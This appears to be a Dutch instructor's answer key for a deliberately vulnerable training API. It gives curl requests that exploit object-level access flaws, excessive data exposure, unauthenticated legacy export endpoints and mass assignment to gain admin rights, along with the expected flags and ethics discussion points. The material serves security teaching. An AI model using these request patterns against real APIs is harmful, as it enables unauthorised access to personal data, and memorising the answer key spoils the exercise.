# Docenten-handleiding

Niet aan studenten uitdelen. Dit document bevat de oplossingen en verwachte vondsten voor de OSINT-versie van WindesAPI.

## Voorbereiding

```bash
python scripts/seed_db.py
uvicorn app.main:app --reload
```

Of met Docker:

```bash
docker run --rm --name WindesAPI -p 8000:8000 gzeel/windesapi:latest
```

Basisaccount voor oefeningen: `sanne` / `welkom123`.

## Kwetsbaarheid 1: BOLA / IDOR

Login als Sanne. Vraag eerst de caselijst op en pas daarna het ID in de URL aan.

```bash
curl -s http://127.0.0.1:8000/api/v2/osint/cases \
  -H 'Authorization: Bearer <TOKEN>'
```

```bash
curl -s http://127.0.0.1:8000/api/v2/osint/cases/202 \
  -H 'Authorization: Bearer <TOKEN>'
```

Verwachte vondsten:

| Locatie | Vondst |
| --- | --- |
| `GET /api/v2/osint/cases/202` | `FLAG{osint_case_bola_restricted_notes}` in `restricted_notes` |
| `GET /api/v2/osint/cases/202` | `FLAG{osint_case_202_accessed}` in `internal_flag` |

## Kwetsbaarheid 2: Excessive Data Exposure

Normale OSINT-lijstcalls geven meer terug dan nodig is.

```bash
curl -s http://127.0.0.1:8000/api/v2/osint/subjects \
  -H 'Authorization: Bearer <TOKEN>'
```

```bash
curl -s http://127.0.0.1:8000/api/v2/osint/sources \
  -H 'Authorization: Bearer <TOKEN>'
```

```bash
curl -s http://127.0.0.1:8000/api/v2/osint/analysts \
  -H 'Authorization: Bearer <TOKEN>'
```

Verwachte vondsten:

| Locatie | Vondst |
| --- | --- |
| `GET /api/v2/osint/subjects` | Fictieve e-mails, telefoons, private addresses, `leaked_password`, `raw_source_json` |
| `GET /api/v2/osint/subjects` | `FLAG{excessive_osint_subject_dump}` |
| `GET /api/v2/osint/sources` | API-keys van fictieve OSINT-bronnen |
| `GET /api/v2/osint/sources` | `FLAG{shadow_osint_source_api_key}` |
| `GET /api/v2/osint/analysts` | Plaintext wachtwoorden, recovery codes, rollen en interne notities |
| `GET /api/v2/osint/analysts` | `FLAG{excessive_analyst_dump}` |

## Kwetsbaarheid 3: Improper Assets Management / Shadow API

Oude crawler- en adminexports staan buiten de studentdocumentatie en hebben geen authenticatie.

```bash
curl -s http://127.0.0.1:8000/api/v1/osint/export
```

```bash
curl -s http://127.0.0.1:8000/api/v1/admin/export
```

Verwachte vondsten:

| Locatie | Vondst |
| --- | --- |
| `/api/v1/osint/export` | Volledige OSINT-export zonder token |
| `/api/v1/osint/export` | `FLAG{legacy_osint_shadow_api_found}` |
| `/api/v1/admin/export` | Database-export inclusief OSINT-tabellen, sessies en config |
| `/api/v1/admin/export` | `FLAG{legacy_export_leaks_config}` |

## Kwetsbaarheid 4: Mass Assignment

De analyst-update accepteert extra velden uit de JSON-body en schrijft die direct naar de database.

```bash
curl -s -X PUT http://127.0.0.1:8000/api/v2/osint/analysts/101 \
  -H 'Authorization: Bearer <TOKEN>' \
  -H 'Content-Type: application/json' \
  -d '{"full_name":"Sanne de Vries","is_admin":true,"can_export":true,"role":"lead-analyst","clearance_level":"admin"}'
```

Daarna kan dezelfde token admin-data ophalen:

```bash
curl -s http://127.0.0.1:8000/api/v2/admin/overview \
  -H 'Authorization: Bearer <TOKEN>'
```

Verwachte vondst:

| Locatie | Vondst |
| --- | --- |
| `GET /api/v2/admin/overview` | Secret config, audit events en hint `Mass assignment kan is_admin en can_export wijzigen.` |

## OSINT Bespreekpunten

1. OSINT is niet hetzelfde als alles verzamelen wat technisch bereikbaar is.
2. Scope, proportionaliteit en dataminimalisatie zijn essentieel, ook bij publieke bronnen.
3. API-responses mogen geen ruwe brondata, credentials of privevelden lekken naar algemene clients.
4. Object-level autorisatie moet per case en per team worden afgedwongen.
5. Oude crawlers, dev dumps en exports moeten dezelfde security controls hebben of verwijderd worden.
6. In echte onderzoeken horen echte personen, priveadressen, telefoonnummers en credentials buiten trainingsdata te blijven.
